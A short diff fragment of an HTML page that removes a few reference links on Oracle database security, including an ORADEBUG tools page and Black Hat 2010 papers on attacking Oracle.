-<li><a target="_blank" rel="noopener" href="http://www.juliandyke.com/Diagnostics/Tools/ORADEBUG/ORADEBUG.html">oradebug</a></li>
-<li><a href="">BlackHat-DC-2010-Litchfield-Oracle11g</a></li>
-<li><a target="_blank" rel="noopener" href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf">Hacking Oracle from the Web</a></li>
-</ol>
 
       
     </div>
